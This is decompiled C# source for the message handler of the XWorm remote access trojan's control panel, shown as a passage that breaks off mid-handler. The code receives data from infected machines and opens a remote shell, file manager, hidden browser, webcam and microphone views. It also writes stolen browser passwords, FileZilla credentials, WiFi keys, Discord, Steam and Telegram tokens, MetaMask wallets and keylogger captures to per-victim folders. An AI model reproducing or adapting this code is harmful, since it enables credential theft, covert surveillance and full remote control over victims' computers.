using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using GMap.NET;
using GMap.NET.MapProviders;
using GMap.NET.WindowsForms;
using GMap.NET.WindowsForms.Markers;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Wave;
using XWorm.My;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000041 RID: 65
	public class Messages
	{
		// Token: 0x06000A0D RID: 2573 RVA: 0x00058D90 File Offset: 0x00056F90
		public static void Read(Client C, byte[] b)
		{
			checked
			{
				try
				{
					string[] array = Strings.Split(Helper.BS(Helper.AES_Decryptor(b, C)), SettingsHelper.SPL, -1, CompareMethod.Binary);
					string text = array[0];
					uint num = <PrivateImplementationDetails>.ComputeStringHash(text);
					if (num <= 2216124205U)
					{
						if (num <= 1064348700U)
						{
							if (num <= 484936711U)
							{
								if (num <= 248743377U)
								{
									if (num <= 85805674U)
									{
										if (num != 46737735U)
										{
											if (num == 85805674U)
											{
												if (Operators.CompareString(text, "FileM", false) == 0)
												{
													bool invokeRequired = Messages.F.InvokeRequired;
													if (invokeRequired)
													{
														Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
														{
															C,
															b
														});
													}
													else
													{
														FM fm = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
														bool flag = fm != null;
														if (flag)
														{
															C.isDisconnected();
														}
														else
														{
															bool flag2 = fm == null;
															if (flag2)
															{
																new FM
																{
																	C = C,
																	CID = array[1],
																	Name = "File Manager : " + array[1],
																	Text = "File Manager : " + array[1]
																}.Show();
															}
														}
													}
												}
											}
										}
										else if (Operators.CompareString(text, "FormHBrowser", false) == 0)
										{
											bool invokeRequired2 = Messages.F.InvokeRequired;
											if (invokeRequired2)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												HBrowser hbrowser = (HBrowser)MyProject.Application.OpenForms["Hidden Browser : " + array[1]];
												bool flag3 = hbrowser != null;
												if (flag3)
												{
													C.isDisconnected();
												}
												else
												{
													bool flag4 = hbrowser == null;
													if (flag4)
													{
														new HBrowser
														{
															C = C,
															Name = "Hidden Browser : " + array[1],
															Text = "Hidden Browser : " + array[1]
														}.Show();
													}
												}
											}
										}
									}
									else if (num != 141293147U)
									{
										if (num != 218589765U)
										{
											if (num == 248743377U)
											{
												if (Operators.CompareString(text, "Chromium", false) == 0)
												{
													bool invokeRequired3 = Messages.F.InvokeRequired;
													if (invokeRequired3)
													{
														Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
														{
															C,
															b
														});
													}
													else
													{
														string text2 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Recovery");
														string text3 = array[2];
														bool flag5 = !string.IsNullOrEmpty(text3);
														if (flag5)
														{
															bool flag6 = !Directory.Exists(text2);
															if (flag6)
															{
																Directory.CreateDirectory(text2);
															}
															File.WriteAllText(text2 + "\\Chromium_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", text3);
															Helper.LVLog(C.IP.Split(new char[]
															{
																':'
															})[0] + " Chromium Passwords Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
														}
														else
														{
															Helper.LVLog(C.IP.Split(new char[]
															{
																':'
															})[0] + " Has No Passwords", Color.MediumPurple);
														}
													}
												}
											}
										}
										else if (Operators.CompareString(text, "INFO", false) == 0)
										{
											bool invokeRequired4 = Messages.F.InvokeRequired;
											if (invokeRequired4)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												try
												{
													C.LV = Messages.F.Lv1.Items.Insert(0, C.IP.Split(new char[]
													{
														':'
													})[0], Messages.GetCountry.LookupCountryCode(C.IP.Split(new char[]
													{
														':'
													})[0]) + ".png");
													C.LV.Tag = C;
													C.LV.UseItemStyleForSubItems = false;
													C.LV.SubItems.Add(Messages.GetCountry.LookupCountryName(C.IP.Split(new char[]
													{
														':'
													})[0]));
													int num2 = array.Length - 1;
													for (int i = 1; i <= num2; i++)
													{
														C.LV.SubItems.Add(array[i]);
													}
													C.LV.SubItems.Add(Helper.GetNotes(array[1]));
													C.LV.SubItems.Add("0d 0h 0m 0s");
													C.LV.SubItems.Add("0000 MS");
													C.LV.SubItems.Add("...");
													Messages.F.Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
													Messages.F._ActiveWindow.Width = 500;
													SettingsHelper.Online.Add(C);
													C.ID = C.LV.SubItems[Messages.F._ID.Index].Text;
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Connected", Color.Green);
													bool notef = SettingsHelper.NOTEF;
													if (notef)
													{
														Messages.F.NotifyIcon1.BalloonTipText = "Connected: " + C.IP.Split(new char[]
														{
															':'
														})[0];
														Messages.F.NotifyIcon1.ShowBalloonTip(100);
													}
												}
												catch (Exception ex)
												{
													Debug.WriteLine("INFO: " + ex.Message);
												}
											}
										}
									}
									else if (Operators.CompareString(text, "ServiceManager", false) == 0)
									{
										bool invokeRequired5 = Messages.F.InvokeRequired;
										if (invokeRequired5)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											ServiceManager serviceManager = (ServiceManager)MyProject.Application.OpenForms["Service Manager : " + array[1]];
											bool flag7 = serviceManager != null;
											if (flag7)
											{
												C.isDisconnected();
											}
											else
											{
												bool flag8 = serviceManager == null;
												if (flag8)
												{
													new ServiceManager
													{
														C = C,
														Name = "Service Manager : " + array[1],
														Text = "Service Manager : " + array[1]
													}.Show();
												}
											}
										}
									}
								}
								else if (num <= 313785905U)
								{
									if (num != 300022785U)
									{
										if (num == 313785905U)
										{
											if (Operators.CompareString(text, "MBox", false) == 0)
											{
												bool invokeRequired6 = Messages.F.InvokeRequired;
												if (invokeRequired6)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													MBox mbox = (MBox)MyProject.Application.OpenForms["MessageBox : " + array[1]];
													bool flag9 = mbox != null;
													if (flag9)
													{
														C.isDisconnected();
													}
													else
													{
														bool flag10 = mbox == null;
														if (flag10)
														{
															new MBox
															{
																C = C,
																Name = "MessageBox : " + array[1],
																Text = "MessageBox : " + array[1]
															}.Show();
														}
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "shell", false) == 0)
									{
										bool invokeRequired7 = Messages.F.InvokeRequired;
										if (invokeRequired7)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											Shell shell = (Shell)MyProject.Application.OpenForms["Shell : " + array[1]];
											bool flag11 = shell != null;
											if (flag11)
											{
												C.isDisconnected();
											}
											else
											{
												bool flag12 = shell == null;
												if (flag12)
												{
													new Shell
													{
														C = C,
														Name = "Shell : " + array[1],
														Text = "Shell : " + array[1]
													}.Show();
												}
											}
										}
									}
								}
								else if (num != 401371324U)
								{
									if (num != 424267057U)
									{
										if (num == 484936711U)
										{
											if (Operators.CompareString(text, "FileManagerMSG", false) == 0)
											{
												bool invokeRequired8 = Messages.F.InvokeRequired;
												if (invokeRequired8)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													FM fm2 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
													bool flag13 = fm2 != null;
													if (flag13)
													{
														fm2.ToolStripStatusLabel1.ForeColor = Color.Green;
														fm2.ToolStripStatusLabel1.Visible = true;
														fm2.ToolStripStatusLabel1.Text = array[2];
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "StartupManager", false) == 0)
									{
										bool invokeRequired9 = Messages.F.InvokeRequired;
										if (invokeRequired9)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											StartupManager startupManager = (StartupManager)MyProject.Application.OpenForms["Startup Manager : " + array[1]];
											bool flag14 = startupManager != null;
											if (flag14)
											{
												C.isDisconnected();
											}
											else
											{
												bool flag15 = startupManager == null;
												if (flag15)
												{
													new StartupManager
													{
														C = C,
														Name = "Startup Manager : " + array[1],
														Text = "Startup Manager : " + array[1]
													}.Show();
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "SNDGet", false) == 0)
								{
									bool invokeRequired10 = Messages.F.InvokeRequired;
									if (invokeRequired10)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										Sound sound = (Sound)MyProject.Application.OpenForms["System Sound : " + array[3]];
										bool flag16 = sound != null;
										if (flag16)
										{
											sound.ToolStripStatusLabel1.Text = "Size :  [" + Helper.BytesToString(unchecked((long)b.Length)) + "]";
											try
											{
												sound.bwp.AddSamples(Helper.Decompress(Convert.FromBase64String(array[1])), 0, Convert.ToInt32(array[2]));
												GC.Collect();
											}
											catch (Exception ex2)
											{
											}
										}
									}
								}
							}
							else if (num <= 760364217U)
							{
								if (num <= 570715758U)
								{
									if (num != 503605282U)
									{
										if (num == 570715758U)
										{
											if (Operators.CompareString(text, "R/", false) == 0)
											{
												bool invokeRequired11 = Messages.F.InvokeRequired;
												if (invokeRequired11)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													Shell shell2 = (Shell)MyProject.Application.OpenForms["Shell : " + array[2]];
													bool flag17 = shell2 != null;
													if (flag17)
													{
														Guna2TextBox guna2TextBox;
														(guna2TextBox = shell2.Guna2TextBox2).Text = guna2TextBox.Text + array[1];
														shell2.Guna2TextBox2.SelectionStart = shell2.Guna2TextBox2.Text.Length;
														shell2.Guna2TextBox2.ScrollToCaret();
														shell2.Guna2TextBox2.Refresh();
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "R#", false) == 0)
									{
										bool invokeRequired12 = Messages.F.InvokeRequired;
										if (invokeRequired12)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											ProcessV processV = (ProcessV)MyProject.Application.OpenForms["Process Manager : " + array[3]];
											bool flag18 = processV != null;
											if (flag18)
											{
												processV.ListView1.Items.Clear();
												processV.ImageList1.Images.Clear();
												string[] array2 = Strings.Split(array[1], "-=>", -1, CompareMethod.Binary);
												int num3 = array2.Length - 1;
												for (int j = 0; j <= num3; j++)
												{
													bool flag19 = array2[j].Length > 0;
													if (flag19)
													{
														ListViewItem listViewItem = new ListViewItem();
														bool flag20 = Operators.CompareString(array2[j + 1], array[2], false) == 0;
														if (flag20)
														{
															listViewItem.ForeColor = Color.Red;
														}
														listViewItem.Text = array2[j];
														listViewItem.SubItems.Add(array2[j + 1]);
														listViewItem.SubItems.Add(array2[j + 4]);
														Image image = Image.FromStream(new MemoryStream(Helper.Decompress(Convert.FromBase64String(array2[j + 2]))));
														processV.ImageList1.Images.Add(array2[j + 1], image);
														listViewItem.ImageKey = array2[j + 1];
														listViewItem.ToolTipText = array2[j + 3];
														processV.ListView1.Items.Add(listViewItem);
													}
													j += 4;
												}
												processV.ToolStripStatusLabel4.Text = "Process [" + Conversions.ToString(processV.ListView1.Items.Count) + "]";
												processV.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
											}
										}
									}
								}
								else if (num != 688737012U)
								{
									if (num != 720998438U)
									{
										if (num == 760364217U)
										{
											if (Operators.CompareString(text, "Xchat", false) == 0)
											{
												bool invokeRequired13 = Messages.F.InvokeRequired;
												if (invokeRequired13)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													Chat chat = (Chat)MyProject.Application.OpenForms["Chat : " + array[1]];
													bool flag21 = chat != null;
													if (flag21)
													{
														C.isDisconnected();
													}
													else
													{
														bool flag22 = chat == null;
														if (flag22)
														{
															new Chat
															{
																C = C,
																Name = "Chat : " + array[1],
																Text = "Chat : " + array[1],
																chatE = false
															}.Show();
														}
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "Recovery", false) == 0)
									{
										bool invokeRequired14 = Messages.F.InvokeRequired;
										if (invokeRequired14)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											string text4 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Recovery");
											string text5 = array[3];
											bool flag23 = !string.IsNullOrEmpty(text5);
											if (flag23)
											{
												bool flag24 = !Directory.Exists(text4);
												if (flag24)
												{
													Directory.CreateDirectory(text4);
												}
											}
											switch (Convert.ToInt32(array[2]))
											{
											case 0:
											{
												bool flag25 = string.IsNullOrEmpty(text5);
												if (flag25)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No FileZilla", Color.MediumPurple);
												}
												else
												{
													File.WriteAllText(text4 + "\\FileZilla_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " FileZilla Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											case 1:
											{
												bool flag26 = string.IsNullOrEmpty(text5);
												if (flag26)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No WifiKeys", Color.MediumPurple);
												}
												else
												{
													File.WriteAllText(text4 + "\\WifiKeys_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " WifiKeys Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											case 2:
											{
												bool flag27 = string.IsNullOrEmpty(text5);
												if (flag27)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No DiscordToken", Color.MediumPurple);
												}
												else
												{
													File.WriteAllText(text4 + "\\DiscordToken_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " DiscordToken Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											case 3:
											{
												bool flag28 = string.IsNullOrEmpty(text5);
												if (flag28)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No ProductKey", Color.MediumPurple);
												}
												else
												{
													File.WriteAllText(text4 + "\\ProductKey_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " ProductKey Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											case 4:
											{
												bool flag29 = string.IsNullOrEmpty(text5);
												if (flag29)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No Telegram_tdata", Color.MediumPurple);
												}
												else
												{
													File.WriteAllBytes(text4 + "\\Telegram_tdata_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".zip", Helper.Decompress(Convert.FromBase64String(text5)));
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Telegram_tdata Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											case 5:
											{
												bool flag30 = string.IsNullOrEmpty(text5);
												if (flag30)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No MetaMask", Color.MediumPurple);
												}
												else
												{
													File.WriteAllBytes(text4 + "\\MetaMask_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".zip", Helper.Decompress(Convert.FromBase64String(text5)));
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " MetaMask Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											case 6:
											{
												bool flag31 = string.IsNullOrEmpty(text5);
												if (flag31)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No Saved Passwords", Color.MediumPurple);
												}
												else
												{
													File.WriteAllText(text4 + "\\PasswordsRecover_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " PasswordsRecovered Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											case 7:
											{
												bool flag32 = string.IsNullOrEmpty(text5);
												if (flag32)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No Saved Passwords", Color.MediumPurple);
												}
												else
												{
													File.WriteAllBytes(text4 + "\\Passwords_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".zip", Helper.Decompress(Convert.FromBase64String(text5)));
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Passwords Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											case 10:
											{
												bool flag33 = string.IsNullOrEmpty(text5);
												if (flag33)
												{
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " Has No SteamToken", Color.MediumPurple);
												}
												else
												{
													File.WriteAllText(text4 + "\\SteamToken_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
													Helper.LVLog(C.IP.Split(new char[]
													{
														':'
													})[0] + " SteamToken Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery", Color.Purple);
												}
												break;
											}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "ActiveWindows", false) == 0)
								{
									bool invokeRequired15 = Messages.F.InvokeRequired;
									if (invokeRequired15)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										ACT act = (ACT)MyProject.Application.OpenForms["ActiveWindows : " + array[1]];
										bool flag34 = act != null;
										if (flag34)
										{
											C.isDisconnected();
										}
										else
										{
											bool flag35 = act == null;
											if (flag35)
											{
												new ACT
												{
													C = C,
													Name = "ActiveWindows : " + array[1],
													Text = "ActiveWindows : " + array[1]
												}.Show();
											}
										}
									}
								}
							}
							else if (num <= 844476846U)
							{
								if (num != 781733780U)
								{
									if (num != 818004062U)
									{
										if (num == 844476846U)
										{
											if (Operators.CompareString(text, "Registry", false) == 0)
											{
												bool invokeRequired16 = Messages.F.InvokeRequired;
												if (invokeRequired16)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													Registry registry = (Registry)MyProject.Application.OpenForms["Registry Editor : " + array[1]];
													bool flag36 = registry != null;
													if (flag36)
													{
														C.isDisconnected();
													}
													else
													{
														bool flag37 = registry == null;
														if (flag37)
														{
															new Registry
															{
																C = C,
																Name = "Registry Editor : " + array[1],
																Text = "Registry Editor : " + array[1]
															}.Show();
														}
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "GetPrograms", false) == 0)
									{
										bool invokeRequired17 = Messages.F.InvokeRequired;
										if (invokeRequired17)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											Programs programs = (Programs)MyProject.Application.OpenForms["Installed Programs : " + array[1]];
											bool flag38 = programs != null;
											if (flag38)
											{
												string[] array3 = Strings.Split(array[2], "-=>", -1, CompareMethod.Binary);
												int num4 = array3.Length - 2;
												for (int k = 0; k <= num4; k++)
												{
													bool flag39 = array3[k].Length > 0;
													if (flag39)
													{
														ListViewItem listViewItem2 = new ListViewItem();
														listViewItem2.Text = array3[k];
														listViewItem2.SubItems.Add(array3[k + 1]);
														listViewItem2.ImageIndex = 0;
														programs.ListView1.Items.Add(listViewItem2);
													}
													k++;
												}
												programs.ToolStripStatusLabel2.Text = "Installed [" + Conversions.ToString(programs.ListView1.Items.Count) + "]";
												programs.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
											}
										}
									}
								}
								else if (Operators.CompareString(text, "OfflineGet", false) == 0)
								{
									bool invokeRequired18 = Messages.F.InvokeRequired;
									if (invokeRequired18)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										string text6 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Keylogger");
										string text7 = array[2];
										bool flag40 = !Directory.Exists(text6);
										if (flag40)
										{
											Directory.CreateDirectory(text6);
										}
										File.WriteAllText(text6 + "\\KeyLogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", text7.Replace("\n", Environment.NewLine).Replace("[ENTER]", Environment.NewLine).Replace("[SPACE]", " "));
										Helper.LVLog(C.IP.Split(new char[]
										{
											':'
										})[0] + " keyLogger was saved @ ClientsFolder \\ " + array[1] + " \\ Keylogger", Color.Purple);
									}
								}
							}
							else if (num != 1018285633U)
							{
								if (num != 1040572293U)
								{
									if (num == 1064348700U)
									{
										if (Operators.CompareString(text, "MICCM", false) == 0)
										{
											bool invokeRequired19 = Messages.F.InvokeRequired;
											if (invokeRequired19)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												MIC mic = (MIC)MyProject.Application.OpenForms["MIC : " + array[2]];
												bool flag41 = mic != null;
												if (flag41)
												{
													C.isDisconnected();
												}
												else
												{
													bool flag42 = mic == null;
													if (flag42)
													{
														mic = new MIC();
														mic.C = C;
														mic.Name = "MIC : " + array[2];
														mic.Text = "MIC : " + array[2];
														foreach (string text8 in Strings.Split(array[1], "-=>", -1, CompareMethod.Binary))
														{
															bool flag43 = Operators.CompareString(text8, null, false) != 0;
															if (flag43)
															{
																mic.Guna2ComboBox1.Items.Add(text8);
															}
														}
														Guna2ComboBox guna2ComboBox;
														(guna2ComboBox = mic.Guna2ComboBox1).SelectedIndex = guna2ComboBox.SelectedIndex + 1;
														try
														{
															mic.waveplayer.Init(mic.bwp);
															mic.waveplayer.Play();
														}
														catch (Exception ex3)
														{
														}
														mic.Show();
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "FormHApps", false) == 0)
								{
									bool invokeRequired20 = Messages.F.InvokeRequired;
									if (invokeRequired20)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										HApps happs = (HApps)MyProject.Application.OpenForms["Hidden Apps : " + array[1]];
										bool flag44 = happs != null;
										if (flag44)
										{
											C.isDisconnected();
										}
										else
										{
											bool flag45 = happs == null;
											if (flag45)
											{
												new HApps
												{
													C = C,
													Name = "Hidden Apps : " + array[1],
													Text = "Hidden Apps : " + array[1]
												}.Show();
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text, "txtttt", false) == 0)
							{
								bool invokeRequired21 = Messages.F.InvokeRequired;
								if (invokeRequired21)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									TXT txt = (TXT)MyProject.Application.OpenForms["Text Viewer : " + array[1]];
									bool flag46 = txt == null;
									if (flag46)
									{
										new TXT
										{
											C = C,
											Name = "Text Viewer : " + array[1],
											Text = "Text Viewer : " + array[1]
										}.Show();
									}
									try
									{
										TXT txt2 = (TXT)MyProject.Application.OpenForms["Text Viewer : " + array[1]];
										txt2.Guna2TextBox1.Text = array[2];
										txt2.Guna2TextBox2.Text = array[3];
									}
									catch (Exception ex4)
									{
									}
								}
							}
						}
						else if (num <= 1714821179U)
						{
							if (num <= 1185679874U)
							{
								if (num <= 1122799859U)
								{
									if (num != 1068781728U)
									{
										if (num == 1122799859U)
										{
											if (Operators.CompareString(text, "CompilerErr", false) == 0)
											{
												bool invokeRequired22 = Messages.F.InvokeRequired;
												if (invokeRequired22)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													VBCode vbcode = (VBCode)MyProject.Application.OpenForms["VB.Net Compiler : " + array[1]];
													bool flag47 = vbcode != null;
													if (flag47)
													{
														vbcode.ToolStripStatusLabel1.ForeColor = Color.Red;
														vbcode.ToolStripStatusLabel1.Visible = true;
														vbcode.ToolStripStatusLabel1.Text = array[2];
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "WBCM", false) == 0)
									{
										bool invokeRequired23 = Messages.F.InvokeRequired;
										if (invokeRequired23)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											WebCam webCam = (WebCam)MyProject.Application.OpenForms["WebCam : " + array[2]];
											bool flag48 = webCam != null;
											if (flag48)
											{
												C.isDisconnected();
											}
											else
											{
												bool flag49 = webCam == null;
												if (flag49)
												{
													webCam = new WebCam();
													webCam.C = C;
													webCam.CID = array[2];
													webCam.Name = "WebCam : " + array[2];
													webCam.Text = "WebCam : " + array[2];
													foreach (string text9 in Strings.Split(array[1], "-=>", -1, CompareMethod.Binary))
													{
														bool flag50 = Operators.CompareString(text9, null, false) != 0;
														if (flag50)
														{
															webCam.Guna2ComboBox2.Items.Add(text9);
														}
													}
													Guna2ComboBox guna2ComboBox;
													(guna2ComboBox = webCam.Guna2ComboBox2).SelectedIndex = guna2ComboBox.SelectedIndex + 1;
													webCam.Show();
												}
											}
										}
									}
								}
								else if (num != 1166368674U)
								{
									if (num != 1178465735U)
									{
										if (num == 1185679874U)
										{
											if (Operators.CompareString(text, "#CAP", false) == 0)
											{
												bool invokeRequired24 = Messages.F.InvokeRequired;
												if (invokeRequired24)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													bool screens = SettingsHelper.Screens;
													if (screens)
													{
														MemoryStream memoryStream = new MemoryStream(Helper.Decompress(Convert.FromBase64String(array[2])));
														Image.FromStream(memoryStream);
														try
														{
															foreach (object obj in Messages.F.Lv4.Items)
															{
																ListViewItem listViewItem3 = (ListViewItem)obj;
																bool flag51 = Operators.CompareString(listViewItem3.SubItems[0].Text, array[1], false) == 0;
																if (flag51)
																{
																	string key = array[1];
																	Image image2 = Messages.F.ImageList1.Images[Messages.F.ImageList1.Images.Keys.IndexOf(array[1])];
																	Messages.F.ImageList1.Images.RemoveByKey(key);
																	Messages.F.ImageList1.Images.Add(key, Image.FromStream(memoryStream));
																	image2.Dispose();
																	memoryStream.Dispose();
																	goto IL_837D;
																}
															}
														}
														finally
														{
															IEnumerator enumerator;
															if (enumerator is IDisposable)
															{
																(enumerator as IDisposable).Dispose();
															}
														}
														Messages.F.ImageList1.Images.Add(array[1], Image.FromStream(memoryStream));
														Messages.F.Lv4.Items.Add(array[1], array[1]);
														memoryStream.Dispose();
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "VOICECHAT", false) == 0)
									{
										bool invokeRequired25 = Messages.F.InvokeRequired;
										if (invokeRequired25)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											VoiceChat voiceChat = (VoiceChat)MyProject.Application.OpenForms["Voice Chat : " + array[1]];
											bool flag52 = voiceChat != null;
											if (flag52)
											{
												C.isDisconnected();
											}
											else
											{
												bool flag53 = voiceChat == null;
												if (flag53)
												{
													voiceChat = new VoiceChat();
													voiceChat.C = C;
													voiceChat.Name = "Voice Chat : " + array[1];
													voiceChat.Text = "Voice Chat : " + array[1];
													int num5 = 0;
													int num6 = WaveIn.DeviceCount - 1;
													int num7 = num5;
													int num8 = num6;
													for (int n = num7; n <= num8; n++)
													{
														voiceChat.Guna2ComboBox1.Items.Add(WaveIn.GetCapabilities(n).ProductName);
													}
													bool flag54 = voiceChat.Guna2ComboBox1.Items.Count < 1;
													if (flag54)
													{
														C.isDisconnected();
														Helper.LVLog("No microphone device can be found!", Color.Red);
														SettingsHelper.MSGS++;
													}
													else
													{
														voiceChat.Guna2ComboBox1.SelectedIndex = 0;
														voiceChat.Show();
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "Msg", false) == 0)
								{
									bool invokeRequired26 = Messages.F.InvokeRequired;
									if (invokeRequired26)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										Helper.LVLog(C.IP.Split(new char[]
										{
											':'
										})[0] + " " + array[1], Color.Purple);
										SettingsHelper.MSGS++;
									}
								}
							}
							else if (num <= 1342098508U)
							{
								if (num != 1216702760U)
								{
									if (num != 1324570353U)
									{
										if (num == 1342098508U)
										{
											if (Operators.CompareString(text, "Cam", false) == 0)
											{
												bool invokeRequired27 = Messages.F.InvokeRequired;
												if (invokeRequired27)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													WebCam webCam2 = (WebCam)MyProject.Application.OpenForms["WebCam : " + array[2]];
													bool flag55 = webCam2 != null;
													if (flag55)
													{
														MemoryStream memoryStream2 = new MemoryStream(Helper.Decompress(Convert.FromBase64String(array[1])));
														webCam2.PictureBox1.Image = Image.FromStream(memoryStream2);
														WebCam webCam3 = webCam2;
														ref int ptr = ref webCam3.FPS;
														webCam3.FPS = ptr + 1;
														bool flag56 = webCam2.sw.ElapsedMilliseconds >= 1000L;
														if (flag56)
														{
															webCam2.Text = string.Concat(new string[]
															{
																"WebCam : ",
																array[2],
																"  FPS:",
																webCam2.FPS.ToString(),
																"  Size:",
																Helper.BytesToString(unchecked((long)b.Length))
															});
